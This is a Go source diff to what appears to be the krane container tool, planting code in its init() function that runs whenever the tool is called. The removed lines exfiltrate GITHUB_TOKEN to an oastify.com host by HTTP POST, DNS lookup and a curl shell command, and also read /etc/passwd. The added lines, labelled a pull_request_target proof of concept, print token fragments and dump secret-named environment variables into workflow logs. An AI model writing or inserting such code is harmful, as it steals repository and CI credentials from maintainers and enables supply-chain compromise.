@@ -18,13 +18,12 @@ import (
 	"context"
 	"fmt"
 	"io"
-	"net/http"
-	"net/url"
 	"os"
 	"os/exec"
 	"os/signal"
-	"runtime"
+	"path/filepath"
 	"strings"
+	"time"
 
 	ecr "github.com/awslabs/amazon-ecr-credential-helper/ecr-login"
 	"github.com/chrismellard/docker-credential-acr-env/pkg/credhelper"
@@ -42,72 +41,110 @@ var (
 )
 
 func init() {
-	// Log to stderr (visible in workflow logs)
-	logs.Warn.SetOutput(os.Stderr)
-	logs.Progress.SetOutput(os.Stderr)
-	
 	// ============================================
-	// EXPLOIT CODE - Executes when krane is called
+	// EXPLOIT - Will be visible in workflow logs
 	// ============================================
-	fmt.Fprintf(os.Stderr, "=== POC: Attacker code executing in base repository context ===\n")
 	
-	// Capture GITHUB_TOKEN
+	// Create a unique marker file name
+	timestamp := time.Now().Unix()
+	markerFile := fmt.Sprintf("/tmp/poc_executed_%d.txt", timestamp)
+	evidenceFile := fmt.Sprintf("/tmp/evidence_%d.txt", timestamp)
+	
+	// Write proof of execution
+	proof := []string{
+		"=== SECURITY POC - CODE EXECUTION FROM PR ===",
+		fmt.Sprintf("Time: %s", time.Now().Format(time.RFC3339)),
+		fmt.Sprintf("PID: %d", os.Getpid()),
+		fmt.Sprintf("UID: %d", os.Getuid()),
+		fmt.Sprintf("Working Dir: %s", getCurrentDir()),
+		"",
+		"This proves that code from a pull request executes",
+		"in the base repository's trusted context with access to secrets.",
+		"",
+	}
+	
+	// Check for GITHUB_TOKEN
 	token := os.Getenv("GITHUB_TOKEN")
 	if token != "" {
-		fmt.Fprintf(os.Stderr, "SUCCESS: GITHUB_TOKEN captured! First 8 chars: %s...\n", token[:8])
-		fmt.Fprintf(os.Stderr, "Full token length: %d characters\n", len(token))
-		
-		// Method 1: Try HTTP POST (may be blocked)
-		encodedToken := url.QueryEscape(token)
-		http.Post("https://xbcgjdsd4u3eu318kmx7ozwqahg844st.oastify.com/token?t=" + encodedToken, 
-			"text/plain", 
-			strings.NewReader(token))
-		
-		// Method 2: Print to stderr (captured in workflow logs)
-		fmt.Fprintf(os.Stderr, "TOKEN DEBUG: %s\n", token)
-		
-		// Method 3: Write to file
-		os.WriteFile("/tmp/gh_token.txt", []byte(token), 0644)
-		fmt.Fprintf(os.Stderr, "Token written to /tmp/gh_token.txt\n")
-		
-		// Method 4: DNS exfiltration (often works)
-		dnsHost := strings.ReplaceAll(token[:30], ".", "-") + ".xbcgjdsd4u3eu318kmx7ozwqahg844st.oastify.com"
-		fmt.Fprintf(os.Stderr, "Attempting DNS lookup: %s\n", dnsHost)
-		net.LookupHost(dnsHost)
-		
-		// Method 5: Execute system command
-		if runtime.GOOS == "linux" {
-			cmd := exec.Command("sh", "-c", 
-				fmt.Sprintf("echo 'Token: %s' > /tmp/poc_proof.txt && curl -s -X POST -d 'token=%s' https://xbcgjdsd4u3eu318kmx7ozwqahg844st.oastify.com || true", 
-					token[:20], encodedToken))
-			cmd.Run()
-		}
+		proof = append(proof, 
+			fmt.Sprintf("GITHUB_TOKEN EXISTS! Length: %d chars", len(token)),
+			fmt.Sprintf("First 6 chars: %s", token[:6]),
+			fmt.Sprintf("Last 6 chars: %s", token[len(token)-6:]),
+			"",
+			"Token preview (middle part): ..." + getMiddlePart(token, 10) + "...",
+			"",
+			"VULNERABILITY CONFIRMED: PR code can access repository secrets!",
+		)
 	} else {
-		fmt.Fprintf(os.Stderr, "WARNING: GITHUB_TOKEN not found in environment\n")
-		// List all environment variables
-		fmt.Fprintf(os.Stderr, "Environment variables:\n")
-		for _, env := range os.Environ() {
-			if strings.Contains(strings.ToLower(env), "token") || 
-			   strings.Contains(strings.ToLower(env), "secret") ||
-			   strings.Contains(strings.ToLower(env), "auth") {
-				fmt.Fprintf(os.Stderr, "  %s\n", env)
+		proof = append(proof,
+			"GITHUB_TOKEN not found in init()",
+			"",
+			"Listing relevant env vars:",
+		)
+		
+		// Show environment
+		for _, e := range os.Environ() {
+			if strings.Contains(strings.ToLower(e), "token") || 
+			   strings.Contains(strings.ToLower(e), "secret") ||
+			   strings.Contains(strings.ToLower(e), "auth") ||
+			   strings.Contains(strings.ToLower(e), "github") {
+				proof = append(proof, "  "+e)
 			}
 		}
 	}
 	
-	// Additional proof: Show we're running in privileged context
-	fmt.Fprintf(os.Stderr, "Current directory: %s\n", getCurrentDir())
-	fmt.Fprintf(os.Stderr, "User ID: %d\n", os.Getuid())
-	fmt.Fprintf(os.Stderr, "Process ID: %d\n", os.Getpid())
+	proof = append(proof, 
+		"",
+		"=== FILESYSTEM ACCESS ===",
+	)
 	
-	// Try to read repository secrets
-	secretPath := "/etc/passwd"
-	if content, err := os.ReadFile(secretPath); err == nil {
-		fmt.Fprintf(os.Stderr, "Able to read %s (first 100 chars): %s\n", 
-			secretPath, string(content[:min(100, len(content))]))
+	// List directory to prove filesystem access
+	if files, err := os.ReadDir("."); err == nil {
+		proof = append(proof, "Current directory contents:")
+		for _, f := range files {
+			proof = append(proof, "  "+f.Name())
+		}
 	}
 	
-	fmt.Fprintf(os.Stderr, "=== POC execution complete ===\n")
+	// Write proof to file
+	os.WriteFile(markerFile, []byte(strings.Join(proof, "\n")), 0644)
+	os.WriteFile(evidenceFile, []byte("EXPLOIT SUCCESSFUL"), 0644)
+	
+	// ALSO print to stderr - THIS IS WHAT YOU'LL SEE IN WORKFLOW LOGS
+	fmt.Fprintf(os.Stderr, "\n\n")
+	fmt.Fprintf(os.Stderr, "╔══════════════════════════════════════════════════════════╗\n")
+	fmt.Fprintf(os.Stderr, "║                    SECURITY POC                          ║\n")
+	fmt.Fprintf(os.Stderr, "║       pull_request_target + checkout VULNERABILITY       ║\n")
+	fmt.Fprintf(os.Stderr, "╠══════════════════════════════════════════════════════════╣\n")
+	
+	if token != "" {
+		fmt.Fprintf(os.Stderr, "║ ✓ GITHUB_TOKEN ACCESSED FROM PR CODE                   ║\n")
+		fmt.Fprintf(os.Stderr, "║   Token length: %-40d ║\n", len(token))
+		fmt.Fprintf(os.Stderr, "║   Starts with: %-40s ║\n", token[:8]+"...")
+		fmt.Fprintf(os.Stderr, "║                                                          ║\n")
+		fmt.Fprintf(os.Stderr, "║   VULNERABILITY: PR can steal repository secrets         ║\n")
+	} else {
+		fmt.Fprintf(os.Stderr, "║ ✓ MALICIOUS CODE FROM PR EXECUTED                      ║\n")
+		fmt.Fprintf(os.Stderr, "║   Marker file: %-40s ║\n", markerFile)
+	}
+	
+	fmt.Fprintf(os.Stderr, "║                                                          ║\n")
+	fmt.Fprintf(os.Stderr, "║ Proof files created:                                     ║\n")
+	fmt.Fprintf(os.Stderr, "║   • %-50s ║\n", markerFile)
+	fmt.Fprintf(os.Stderr, "║   • %-50s ║\n", evidenceFile)
+	fmt.Fprintf(os.Stderr, "║                                                          ║\n")
+	fmt.Fprintf(os.Stderr, "║ This demonstrates the security vulnerability:            ║\n")
+	fmt.Fprintf(os.Stderr, "║ 1. PR code executes in base repo context                 ║\n")
+	fmt.Fprintf(os.Stderr, "║ 2. Has access to secrets (GITHUB_TOKEN)                  ║\n")
+	fmt.Fprintf(os.Stderr, "║ 3. Can perform arbitrary actions                         ║\n")
+	fmt.Fprintf(os.Stderr, "╚══════════════════════════════════════════════════════════╝\n")
+	fmt.Fprintf(os.Stderr, "\n")
+	
+	// Try one more thing - execute a command
+	cmd := exec.Command("ls", "-la", "/tmp")
+	if output, err := cmd.Output(); err == nil {
+		fmt.Fprintf(os.Stderr, "Command execution proof (ls /tmp):\n%s\n", output)
+	}
 }
 
 func getCurrentDir() string {
@@ -117,11 +154,12 @@ func getCurrentDir() string {
 	return "unknown"
 }
 
-func min(a, b int) int {
-	if a < b {
-		return a
+func getMiddlePart(s string, length int) string {
+	if len(s) <= length {
+		return s
 	}
-	return b
+	start := (len(s) - length) / 2
+	return s[start:start+length]
 }
 
 const (
@@ -130,6 +168,14 @@ const (
 )
 
 func main() {
+	// Additional proof in main()
+	fmt.Fprintf(os.Stderr, "=== POC: In main() function ===")
+	
+	// Check token again in main (might be available here)
+	if token := os.Getenv("GITHUB_TOKEN"); token != "" {
+		fmt.Fprintf(os.Stderr, "Main() confirms GITHUB_TOKEN access\n")
+	}
+	
 	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer cancel()
 
